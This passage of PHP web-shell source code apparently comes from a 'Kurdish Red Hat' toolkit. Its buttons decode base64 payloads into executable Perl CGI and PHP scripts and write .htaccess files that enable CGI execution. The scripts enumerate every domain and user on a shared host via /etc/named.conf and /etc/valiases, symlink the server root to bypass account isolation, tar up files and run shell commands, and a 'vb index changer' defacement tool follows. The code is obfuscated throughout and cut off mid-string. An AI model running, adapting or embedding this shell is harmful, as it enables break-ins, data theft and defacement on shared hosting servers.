U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwvcD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5lczsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxpbmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5Eb25lICEhPC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw==';
$decryp=(base64_decode($da));
mkdir('perl', 0777);
$hope = fopen("perl/.htaccess", 'w');
$hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .root\nAddHandler cgi-script .root\nAddHandler cgi-script .root";
fwrite ( $hope, $hcon ) ;
$pelfile = fopen("perl/kurd.root" ,"w");
fwrite ($pelfile,$decryp);
chmod("perl/kurd.root",0755);
echo "<iframe src=perl/kurd.root width=50% height=70% ></iframe><br><br> ";
echo "<font size=4><br><a href=perl/><u>sym Here</u></a></font>";

}
?>

<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">domain Crack<font><br><p>
<font size=3 color=white>--==[[ <input type=submit name=domain value="domain php"> ]]==--</font></form>
<center>
<p>
<?php
if(isset($_POST['domain']))
{
error_reporting(0);
mkdir('domain', 0777);
    chdir('domain');
        fclose ($mkdirr);
$sara1 = 'PD9waHANCiRldmFsPSJaV05vYnlBaVBIUnBkR3hsUGtSdmJXRnBiand2ZEdsMGJHVStEUW9nUEhOMGVXeGxQZzBLSUNBZ0lDQWdZbTlrZVEwS0lDQWdJQ0FnSUNCN0RRb2dJQ0FnSUNBZ0lHSmhZMnRuY205MWJtUTZJQ013TVRBeE1ERTdEUW9nSUNBZ0lDQWdJR052Ykc5eU9pQWpabVptT3cwS0lDQWdJQ0FnSUNCbWIyNTBMV1poYldsc2VUb2dWR0ZvYjIxaE93MEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQmhEUW9nSUNBZ0lDQWdJSHNOQ2lBZ0lDQWdJQ0FnWm05dWRDMW1ZVzFwYkhrNmIzSmlhWFJ5YjI0N0RRb2dJQ0FnSUNBZ0lIQmhaR1JwYm1jNk5IQjRJRFp3ZURzTkNpQWdJQ0FnSUNBZ2JXRnlaMmx1T2pBN0RRb2dJQ0FnSUNBZ0lIUmxlSFF0WkdWamIzSmhkR2x2YmpwdWIyNWxPdzBLSUNBZ0lDQWdJQ0JzWlhSMFpYSXRjM0JoWTJsdVp6b3hjSGc3RFFvZ0lDQWdJQ0FnSUdOdmJHOXlPaU13UmpBN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lHRTZhRzkyWlhJTkNpQWdJQ0FnSUNBZ2V3MEtJQ0FnSUNBZ0lDQmlZV05yWjNKdmRXNWtPbkpuWW1Fb016VXNPVFlzTVRVMkxEQXVNaWs3RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUhSbGVIUmhjbVZoRFFvZ0lDQWdJQ0FnSUhzTkNpQWdJQ0FnSUNBZ1ltRmphMmR5YjNWdVpEb2pNVEV4TVRFeE93MEtJQ0FnSUNBZ0lDQmpiMnh2Y2pvak1FWXdPdzBLSUNBZ0lDQWdJQ0J0WVhKbmFXNDZNQ0EwY0hnN0RRb2dJQ0FnSUNBZ0lHSnZjbVJsY2pveGNIZ2djMjlzYVdRZ0l6VTFOVFUxTlRzTkNpQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2FXNXdkWFFOQ2lBZ0lDQWdJQ0FnZXcwS0lDQWdJQ0FnSUNCaVlXTnJaM0p2ZFc1a09pTXhNVEV4TVRFN0RRb2dJQ0FnSUNBZ0lHTnZiRzl5T2lNd1JqQTdEUW9nSUNBZ0lDQWdJRzFoY21kcGJqb3dJRFJ3ZURzTkNpQWdJQ0FnSUNBZ1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNBak5UVTFOVFUxT3cwS0lDQWdJQ0FnSUNCaWIzSmtaWEl0Y21Ga2FYVnpPamx3ZURzTkNpQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2MyVnNaV04wRFFvZ0lDQWdJQ0FnSUhzTkNpQWdJQ0FnSUNBZ1ltRmphMmR5YjNWdVpEb2pNVEV4TVRFeE93MEtJQ0FnSUNBZ0lDQmpiMnh2Y2pvak1FWXdPdzBLSUNBZ0lDQWdJQ0J0WVhKbmFXNDZNQ0EwY0hnN0RRb2dJQ0FnSUNBZ0lHSnZjbVJsY2pveGNIZ2djMjlzYVdRZ0l6VTFOVFUxTlRzTkNpQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2FXNXdkWFE2Wm05amRYTXNJSFJsZUhSaGNtVmhPbVp2WTNWeklDeGlkWFIwYjI0NllXTjBhWFpsSUN4elpXeGxZM1E2Wm05amRYTU5DaUFnSUNBZ0lDQWdldzBLSUNBZ0lDQWdJQ0JpYjNndGMyaGhaRzkzT2lBd0lEQWdOWEI0SUNNMFF6Z3pRVVk3RFFvZ0lDQWdJQ0FnSUMxM1pXSnJhWFF0WW05NExYTm9ZV1J2ZHpvZ01DQXdJRFZ3ZUNCeVoySmhLREFzSURBc0lESTFOU3dnTVNrN0RRb2dJQ0FnSUNBZ0lDMXRiM290WW05NExYTm9ZV1J2ZHpvZ01DQXdJRFZ3ZUNCeVoySmhLREFzSURBc0lESTFOU3dnTVNrN0RRb2dJQ0FnSUNBZ0lHSmhZMnRuY205MWJtUTZJekl5TWpJeU1qc05DaUFnSUNBZ0lDQWdiM1psY21ac2IzYzZJR0YxZEc4N0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lIUmhZbXhsRFFvZ0lDQWdJQ0FnSUhzTkNpQWdJQ0FnSUNBZ1ltRmphMmR5YjNWdVpEb2pNVEV4TVRFeE93MEtJQ0FnSUNBZ0lDQmpiMnh2Y2pvalkyTmpZMk5qT3cwS0lDQWdJQ0FnSUNCd1lXUmthVzVuT2pad2VDQTRjSGc3RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUR3dmMzUjViR1UrRFFvOGNDQmhiR2xuYmoxalpXNTBaWEkrSUVGc2JDQWdSRzl0WVdsdWN5QW1JRlZ6WlhKelBDOXdQZzBLUEhBZ1lXeHBaMjQ5WTJWdWRHVnlQbUo1SUZKbFpDQklZWFFvYlhWb2JXRmtaVzFoWkNrOEwzQStQR05sYm5SbGNqNGlPdzBLRFFva1pEQnRZV2x1Y3lBOUlFQm1hV3hsS0NJdlpYUmpMMjVoYldWa0xtTnZibVlpS1RzTkNnMEthV1lvSVNSa01HMWhhVzV6S1hzZ1pHbGxLQ0k4WWo0aklHTmhiaWQwSUZKbFlVUWdMVDRnV3lBdlpYUmpMMjVoYldWa0xtTnZibVlnWFNJcE95QjlEUW9OQ21WamFHOGdJangwWVdKc1pTQmhiR2xuYmoxalpXNTBaWElnWW05eVpHVnlQVEUrRFFvOGRISWdZbWRqYjJ4dmNqMW5jbVZsYmo0OGRHUStSRzl0WVdsdWN6d3ZkR1ErUEhSa1BsVnpaWEp6UEM5MFpENDhMM1J5UGlJN0RRb05DbVp2Y21WaFkyZ29KR1F3YldGcGJuTWdZWE1nSkdRd2JXRnBiaWw3RFFvTkNtbG1LR1Z5WldkcEtDSjZiMjVsSWl3a1pEQnRZV2x1S1NsN0RRb05DbkJ5WldkZmJXRjBZMmhmWVd4c0tDY2plbTl1WlNBaUtDNHFLU0lqSnl3Z0pHUXdiV0ZwYml3Z0pHUnZiV0ZwYm5NcE93MEtabXgxYzJnb0tUc05DZzBLYVdZb2MzUnliR1Z1S0hSeWFXMG9KR1J2YldGcGJuTmJNVjFiTUYwcEtTQStJRElwZXlBTkNnMEtKSFZ6WlhJZ1BTQndiM05wZUY5blpYUndkM1ZwWkNoQVptbHNaVzkzYm1WeUtDSXZaWFJqTDNaaGJHbGhjMlZ6THlJdUpHUnZiV0ZwYm5OYk1WMWJNRjBwS1RzTkNnMEtaV05vYnlBaVBIUnlQangwWkQ0OFlTQm9jbVZtUFdoMGRIQTZMeTkzZDNjdUlpNGtaRzl0WVdsdWMxc3hYVnN3WFM0aUx6NGlMaVJrYjIxaGFXNXpXekZkV3pCZExpSThMMkUrUEM5MFpENDhkR1ErSWk0a2RYTmxjbHNuYm1GdFpTZGRMaUk4TDNSa1Bqd3ZkSEkrSWpzZ1pteDFjMmdvS1RzTkNnMEtmWDE5RFFvTkNtVmphRzhnSWp3dmRHRmliR1UrRFFvOGNDQmhiR2xuYmowblkyVnVkR1Z5Sno0TkNpQThZU0JvY21WbVBTY3ZKejROQ2cwS1BDOXdQZzBLSWpzTkNnMEtQejQ9IjsNCmV2YWwoYmFzZTY0X2RlY29kZSgkZXZhbCkpOw0KPz4=';
$file = fopen("domain.php" ,"w+");
$write = fwrite ($file ,base64_decode($sara1));
fclose($file);
echo "<font size=4><br><a href=domain/domain.php><u>domain.php click here </u></a></font>";
}
?>
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=perldom value="domain perl"> ]]==--</font></form>
<p>
<?php
if(isset($_POST['perldom']))
{
error_reporting(0);

$da1='IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOwpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4KCjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+Cjx0aXRsZT5wZXJsIGRvbWFpbjwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Ci5uZXdTdHlsZTEgewogYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsKIGZvbnQtZmFtaWx5OiAiQ291cmllciBOZXciLCBDb3VyaWVyLCBtb25vc3BhY2U7CiBmb250LXNpemU6IGxhcmdlOwogZm9udC13ZWlnaHQ6IGJvbGQ7CiBjb2xvcjogI0ZGRkZGRjsKfQouc3R5bGUxIHsKIHRleHQtYWxpZ246IGNlbnRlcjsKfQo8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4KCjxwIGNsYXNzPSJzdHlsZTEiPkRvbWFpbnMgJmFtcDsgVXNlcnMgPC9wPgo8cCBjbGFzcz0ic3R5bGUxIj5CeXBhc3M8L3A+CjxwIGNsYXNzPSJzdHlsZTEiPkJ5IFJlZCBIYXQgPC9wPgo8cCBjbGFzcz0ic3R5bGUxIj5odHRwczp3d3cuZmFjZWJvb2suY29tL211aG1hZC5hYmR1bGxrYXJlbSA8L3A+Cic7Cm9wZW4gKGQwbWFpbnMsICcvZXRjL25hbWVkLmNvbmYnKSBvciAkZXJyPTE7CkBrciA9IDxkMG1haW5zPjsKY2xvc2UgZDBtYWluczsKaWYgKCRlcnIpewpwcmludCAoJzxwIGNsYXNzPSJzdHlsZTEiPiZuYnNwOzwvcD48cCBjbGFzcz0ic3R5bGUxIj46KDwvcD4nKTsKZGllKCk7Cn1lbHNlewpwcmludCAnPHAgY2xhc3M9InN0eWxlMSI+Jm5ic3A7PC9wPgo8cCBjbGFzcz0ic3R5bGUxIj5IZXJlIGlzIEFsbCBEb21haW5zICZhbXA7IFVzZXJzIDo8L3A+Cic7fQpmb3JlYWNoIG15ICRvbmUgKEBrcikKewppZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKXsKJGZpbGVuYW1lPSAiL2V0Yy92YWxpYXNlcy8iLiQxOwokb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CnByaW50ICc8cCBjbGFzcz0ic3R5bGUxIj4nLiQxLicgOiAnLiRvd25lci4nPC9wPgonOwp9Cn0KcHJpbnQnPC9ib2R5PjwvaHRtbD4nOwo=';
$decryp=(base64_decode($da1));
mkdir('domain', 0777);
$hope = fopen("domain/.htaccess", 'w');
$hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .root\nAddHandler cgi-script .root\nAddHandler cgi-script .root";
fwrite ( $hope, $hcon ) ;
$pelfile = fopen("domain/dom.root" ,"w");
fwrite ($pelfile,$decryp);
chmod("domain/dom.root",0755);
echo "<font size=4><br><a href=domain/dom.root><u>domain.pl  click here</u></a></font>";

}
?>
<form method=post>
<font size=3 color=white>--==[[ <input type=submit name=creack1 value="etc/named.conf bypass"> ]]==--</font></form>
<p>
<?php
if(isset($_POST['creack1']))
{
error_reporting(0);
mkdir('named', 0755);
    chdir('named');
        fclose ($mkdirr);
$sara11 = 'PD9waHANCiRldmFsPSJEUW9rYTNWeVpDQTlJQ2NOQ2p3dmMyTnlhWEIwUGljN0lEOCtEUW84YUhSdGJENE5DZ2s4TDJrK0RRbzhMMlp2Ym5RK0RRbzhMMlp2Ym5RK1BDOWthWFkrRFFvOEwyWnZiblErRFFvOGNDQmhiR2xuYmowaVkyVnVkR1Z5SWo0OFlqNDhhVDQ4Wm05dWRDQmpiMnh2Y2owaUl6Z3dPREF3TUNJK1BHRWdhSEpsWmowaWFIUjBjSE02THk5bVlXTmxZbTl2YXk1amIyMHZiWFZvYldGa0xtRmlaSFZzYkd0aGNtVnRJajROQ2p4bWIyNTBJR052Ykc5eVBTSWpPREE0TURBd0lqNDhjM0JoYmlCemRIbHNaVDBpZEdWNGRDMWtaV052Y21GMGFXOXVPaUJ1YjI1bElqNG9ReWtnUW5rZ1RYVm9iV0ZrUlcxaFpDQXlNREUwS1NBOEwzTndZVzQrUEM5bWIyNTBQand2WVQ0OEwyWnZiblErUEM5cFBqd3ZZajQ4TDNBK0RRbzhMM05qY21sd2RENE5DanhqWlc1MFpYSStEUW84ZEdsMGJHVStTM1Z5WkdsemFDQlNaV1FnU0dGMFBDOTBhWFJzWlQ0TkNpQWdJQ0FnSUR4emRIbHNaVDROQ2lBZ0lDQWdJR0p2WkhrTkNpQWdJQ0FnSUNBZ2V3MEtJQ0FnSUNBZ0lDQmlZV05yWjNKdmRXNWtPaUFqTURFd01UQXhPdzBLSUNBZ0lDQWdJQ0JqYjJ4dmNqb2dJMlptWmpzTkNpQWdJQ0FnSUNBZ1ptOXVkQzFtWVcxcGJIazZJRlJoYUc5dFlUc05DaUFnSUNBZ0lDQWdmUTBLSUNBZ0lDQWdZUTBLSUNBZ0lDQWdJQ0I3RFFvZ0lDQWdJQ0FnSUdadmJuUXRabUZ0YVd4NU9tOXlZbWwwY205dU93MEtJQ0FnSUNBZ0lDQndZV1JrYVc1bk9qUndlQ0EyY0hnN0RRb2dJQ0FnSUNBZ0lHMWhjbWRwYmpvd093MEtJQ0FnSUNBZ0lDQjBaWGgwTFdSbFkyOXlZWFJwYjI0NmJtOXVaVHNOQ2lBZ0lDQWdJQ0FnYkdWMGRHVnlMWE53WVdOcGJtYzZNWEI0T3cwS0lDQWdJQ0FnSUNCamIyeHZjam9qTUVZd093MEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQmhPbWh2ZG1WeURRb2dJQ0FnSUNBZ0lIc05DaUFnSUNBZ0lDQWdZbUZqYTJkeWIzVnVaRHB5WjJKaEtETTFMRGsyTERFMU5pd3dMaklwT3cwS0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNCMFpYaDBZWEpsWVEwS0lDQWdJQ0FnSUNCN0RRb2dJQ0FnSUNBZ0lHSmhZMnRuY205MWJtUTZJekV4TVRFeE1Uc05DaUFnSUNBZ0lDQWdZMjlzYjNJNkl6QkdNRHNOQ2lBZ0lDQWdJQ0FnYldGeVoybHVPakFnTkhCNE93MEtJQ0FnSUNBZ0lDQmliM0prWlhJNk1YQjRJSE52Ykdsa0lDTTFOVFUxTlRVN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lHbHVjSFYwRFFvZ0lDQWdJQ0FnSUhzTkNpQWdJQ0FnSUNBZ1ltRmphMmR5YjNWdVpEb2pNVEV4TVRFeE93MEtJQ0FnSUNBZ0lDQmpiMnh2Y2pvak1FWXdPdzBLSUNBZ0lDQWdJQ0J0WVhKbmFXNDZNQ0EwY0hnN0RRb2dJQ0FnSUNBZ0lHSnZjbVJsY2pveGNIZ2djMjlzYVdRZ0l6VTFOVFUxTlRzTkNpQWdJQ0FnSUNBZ1ltOXlaR1Z5TFhKaFpHbDFjem81Y0hnN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lITmxiR1ZqZEEwS0lDQWdJQ0FnSUNCN0RRb2dJQ0FnSUNBZ0lHSmhZMnRuY205MWJtUTZJekV4TVRFeE1Uc05DaUFnSUNBZ0lDQWdZMjlzYjNJNkl6QkdNRHNOQ2lBZ0lDQWdJQ0FnYldGeVoybHVPakFnTkhCNE93MEtJQ0FnSUNBZ0lDQmliM0prWlhJNk1YQjRJSE52Ykdsa0lDTTFOVFUxTlRVN0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lHbHVjSFYwT21adlkzVnpMQ0IwWlhoMFlYSmxZVHBtYjJOMWN5QXNZblYwZEc5dU9tRmpkR2wyWlNBc2MyVnNaV04wT21adlkzVnpEUW9nSUNBZ0lDQWdJSHNOQ2lBZ0lDQWdJQ0FnWW05NExYTm9ZV1J2ZHpvZ01DQXdJRFZ3ZUNBak5FTTRNMEZHT3cwS0lDQWdJQ0FnSUNBdGQyVmlhMmwwTFdKdmVDMXphR0ZrYjNjNklEQWdNQ0ExY0hnZ2NtZGlZU2d3TENBd0xDQXlOVFVzSURFcE93MEtJQ0FnSUNBZ0lDQXRiVzk2TFdKdmVDMXphR0ZrYjNjNklEQWdNQ0ExY0hnZ2NtZGlZU2d3TENBd0xDQXlOVFVzSURFcE93MEtJQ0FnSUNBZ0lDQmlZV05yWjNKdmRXNWtPaU15TWpJeU1qSTdEUW9nSUNBZ0lDQWdJRzkyWlhKbWJHOTNPaUJoZFhSdk93MEtJQ0FnSUNBZ0lDQjlEUW9nSUNBZ0lDQjBZV0pzWlEwS0lDQWdJQ0FnSUNCN0RRb2dJQ0FnSUNBZ0lHSmhZMnRuY205MWJtUTZJekV4TVRFeE1Uc05DaUFnSUNBZ0lDQWdZMjlzYjNJNkkyTmpZMk5qWXpzTkNpQWdJQ0FnSUNBZ2NHRmtaR2x1WnpvMmNIZ2dPSEI0T3cwS0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNBOEwzTjBlV3hsUGcwS1BITmpjbWx3ZENCc1lXNW5kV0ZuWlQxY0oycGhkbUZ6WTNKcGNIUmNKejROQ21aMWJtTjBhVzl1SUdocFpHVmZaR2wyS0dsa0tRMEtldzBLWkc5amRXMWxiblF1WjJWMFJXeGxiV1Z1ZEVKNVNXUW9hV1FwTG5OMGVXeGxMbVJwYzNCc1lYa2dQU0JjSjI1dmJtVmNKenNOQ21SdlkzVnRaVzUwTG1OdmIydHBaVDFwWkN0Y0p6MHdPMXduT3cwS2ZRMEtablZ1WTNScGIyNGdjMmh2ZDE5a2FYWW9hV1FwRFFwN0RRcGtiMk4xYldWdWRDNW5aWFJGYkdWdFpXNTBRbmxKWkNocFpDa3VjM1I1YkdVdVpHbHpjR3hoZVNBOUlGd25ZbXh2WTJ0Y0p6c05DbVJ2WTNWdFpXNTBMbU52YjJ0cFpUMXBaQ3RjSnoweE8xd25PdzBLZlEwS1puVnVZM1JwYjI0Z1kyaGhibWRsWDJScGRuTjBLR2xrS1EwS2V3MEthV1lnS0dSdlkzVnRaVzUwTG1kbGRFVnNaVzFsYm5SQ2VVbGtLR2xrS1M1emRIbHNaUzVrYVhOd2JHRjVJRDA5SUZ3bmJtOXVaVnduS1EwS2MyaHZkMTlrYVhZb2FXUXBPdzBLWld4elpRMEthR2xrWlY5a2FYWW9hV1FwT3cwS2ZRMEtQQzl6WTNKcGNIUStEUW84WW05a2VTQnpkSGxzWlQwaVkyOXNiM0k2SUNNd01EZ3dNREFpUGcwS0RRbzhZMlZ1ZEdWeVBnMEtQR1p2Ym5RZ1kyOXNiM0k5SXpnd09EQXdNQ0J6YVhwbFBUUStJQ1p1WW5Od08wTmhiblFnY21WaFpDQXZaWFJqTDI1aGJXVmtMbU52Ym1ZZ1lubHdZWE56SUR3dlptOXVkRDROQ2p4bWIzSnRJRzFsZEdodlpEMXdiM04wUGcwS1BHbHVjSFYwSUhSNWNHVTljM1ZpYldsMElHNWhiV1U5SW0xeklpQjJZV3gxWlQwaVlubHdZWE56SWlBdlBqd3ZabTl5YlQ0TkNnMEtEUW84UHcwS2FXWW9hWE56WlhRb0pGOVFUMU5VV3lkdGN5ZGRLU2tOQ25zTkNtVnljbTl5WDNKbGNHOXlkR2x1Wnlnd0tUc05DaVJqYldROUlteHpJQzkyWVhJdmJtRnRaV1FpT3cwS0pISTljMmhsYkd4ZlpYaGxZeWdrWTIxa0tUc05DZzBLRFFwdGEyUnBjaWduWkc5dFlXbHVKeXd3TnpjM0tUc05DZzBLRFFvTkNnMEtKSEp5SUQwZ0lpQlBjSFJwYjI1eklHRnNiQ0JjYmlCRWFYSmxZM1J2Y25sSmJtUmxlQ0JUZFhndWFIUnRiQ0JjYmlCQlpHUlVlWEJsSUhSbGVIUXZjR3hoYVc0Z0xuQm9jQ0JjYmlCQlpHUklZVzVrYkdWeUlITmxjblpsY2kxd1lYSnpaV1FnTG5Cb2NDQmNiaUJCWkdSVWVYQmxJSFJsZUhRdmNHeGhhVzRnTG1oMGJXd2dYRzRnUVdSa1NHRnVaR3hsY2lCMGVIUWdMbWgwYld3Z1hHNGdVbVZ4ZFdseVpTQk9iMjVsSUZ4dUlGTmhkR2x6Wm5rZ1FXNTVJanNOQ2lSbUlEMGdabTl3Wlc0b0oyUnZiV0ZwYmk4dWFIUmhZMk5sYzNNbkxDZDNKeWs3RFFvTkNpUmtiMjFoYVc0Z1BTQnplVzFzYVc1cktDSXZJaXdpWkc5dFlXbHVMM0p2YjNRaUtUc05DZzBLWm5keWFYUmxLQ1JtSUN3Z0pISnlLVHNOQ2o4K1BHWnZjbTBnYldWMGFHOWtQWEJ2YzNRK1BIUmxlSFJoY21WaElISnZkM005TVNCamIyeHpQVFFnYm1GdFpUMTNaV0krUEQ5d2FIQWdaV05vYnlBa2Nqcy9Qand2ZEdWNGRHRnlaV0UrUEdKeVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQnVZVzFsUFhjZ2RtRnNkV1U5SW5OMFlYSjBJQ0lnTHo0TkNqd3ZabTl5YlQ0TkNqdy9jR2h3RFFvTkNuME5DZzBLWlhKeWIzSmZjbVZ3YjNKMGFXNW5LREFwT3cwS0pIZGxZbk05Wlhod2JHOWtaU2dpWEc0aUxDUmZVRTlUVkZzbmQyVmlKMTBwT3cwS2FXWW9hWE56WlhRb0pGOVFUMU5VV3lkM0oxMHBLUTBLZXcwS0pIZGxZbk05Wlhod2JHOWtaU2dpWEc0aUxDUmZVRTlUVkZzbmQyVmlKMTBwT3cwS1pXTm9ieUFpUEhSaFlteGxJSGRwWkhSb1BUUXdKU0JoYkdsbmJqMWpaVzUwWlhJZ1ltOXlaR1Z5UFRFK0RRbzhkSEkrUEhSa0lHRnNhV2R1UFdObGJuUmxjajV6YVhSbGN6d3ZkR1ErUEhSa0lHRnNhV2R1UFdObGJuUmxjajUxYzJWeVBDOTBaRDQ4ZEdRK2MzbHRiR2x1YXp3dmRHUStQQzkwY2o0aU93MEtabTl5WldGamFDZ2tkMlZpY3lCaGN5QWtaaWtOQ25zTkNpUnpkSEk5YzNWaWMzUnlYM0psY0d4aFkyVW9KR1lzSWlJc0xUUXBPdzBLRFFvTkNpUjFjMlZ5SUQwZ2NHOXphWGhmWjJWMGNIZDFhV1FvUUdacGJHVnZkMjVsY2lnaUwyVjBZeTkyWVd4cFlYTmxjeThpTGlSemRISXBLVHNOQ2cwS1pXTm9ieUFpUEhSaFlteGxJR0p2Y21SbGNqMHhJSGRwWkhSb1BUUXdKVDQ4ZEhJK1BIUmtJR0ZzYVdkdVBXTmxiblJsY2o0OFptOXVkQ0JqYjJ4dmNqMXlaV1ErSWk0a2MzUnlMaUk4TDJadmJuUStQQzkwWkQ0OGRHUWdZV3hwWjI0OVkyVnVkR1Z5UGp4bWIyNTBJR052Ykc5eVBYZG9hWFJsUGlJdUpIVnpaWEpiSjI1aGJXVW5YUzRpUEM5MFpENDhkR1ErUEdFZ2FISmxaajFrYjIxaGFXNHZjbTl2ZEM5b2IyMWxMeUl1SkhWelpYSmJKMjVoYldVblhTNGlMM0IxWW14cFkxOW9kRzFzTHo1emVXMXNhVzVyUEM5aFBqd3ZkSEkrUEM5MFlXSnNaVDRpT3lCbWJIVnphQ2dwT3cwS0RRb05DZzBLRFFvTkNuME5DZzBLZlEwS0RRb05DajgrRFFvOEwyTmxiblJsY2o0TkNnPT0iOw0KZXZhbChiYXNlNjRfZGVjb2RlKCRldmFsKSk7DQo/Pg==';

$file = fopen("named.php" ,"w+");
$write = fwrite ($file ,base64_decode($sara11));
fclose($file);
echo "<iframe src=named/named.php width=80% height=110% ></iframe><br><br> ";
}
?>
<?/* Priv8 */
?>
<div align=center><table width=100% border=1><tr><td align=center></td></tr></table>
<form method=post><font color=Green size=4 face="comic sans ms">Priv8<font><br>
<font size=3 color=white>--==[[ <input type=submit name=chngervb value="vb index changer"> ]]==--</font></form><center>
<p>
<?php
if(isset($_POST['chngervb']))
{
error_reporting(0);
mkdir('.chnger', 0755);
    chdir('.chnger');      
        fclose ($mkdirr);
$ssss= 'PD9waHANCi8qDQogICB8LnwufC58LnwufC58LnwufC58LnwufC58LnwufC58LnwufC58LnwufC58LnwNCiB8LnwjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI3wufA0KIHwufCMgICAgICAgICAgS3VyRGlTaCBDeWJlciBBbXJ5ICAgICAgICAgICAjfC58DQogfC58IyAgUG93ZXJlZCBieSBNci5BbGkgSGF3bGVSeSAmIE1SLlJlZEhhdCN8LnwNCiB8LnwjICAgICAgICAgICBhbGxpLmhhd2xsZXJ5QGdtYWlsLmNvbSAgICAgI3wufA0KIHwufCMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjfC58DQogICB8LnwufC58LnwufC58LnwufC58LnwufC58LnwufC58LnwufC58LnwufC58LnwNCiovDQoNCj8+DQo8aHRtbD48c3R5bGU+DQppbnB1dCwgc2VsZWN0LCB0ZXh0YXJlYSB7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0KYm9yZGVyLXN0eWxlOiAjN2E3YzdkOw0KYm9yZGVyLXdpZHRoOiAxcHg7DQpmb250LWZhbWlseTogdmVyZGFuYSwgYXJpYWwsIHNhbnMtc2VyaWY7DQpmb250LXNpemU6IDExcHg7DQpjb2xvcjogIzdhN2M3ZDsNCnBhZGRpbmc6IDBweDsNCn0NCkE6bGluayB7DQpDT0xPUjojQTJBMkEyOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQpDT0xPUjojQTJBMkEyOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCkNPTE9SOiM3ODc4Nzg7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQpjb2xvcjojOEM4QzhDO1RFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KCSAgLnN0eWxlMSB7DQoJCSAgY29sb3I6ICNGRjAwMDA7DQoJICAJZm9udC1mYW1pbHk6ICJDb3VyaWVyIE5ldyIsIENvdXJpZXIsIG1vbm9zcGFjZTsNCgkgIAlmb250LXNpemU6IHh4LWxhcmdlOw0KCSAgfQ0KCSAgLnN0eWxlMiB7DQoJCSAgY29sb3I6ICM2NjY2NjY7DQoJICAJZm9udC1mYW1pbHk6ICJDb3V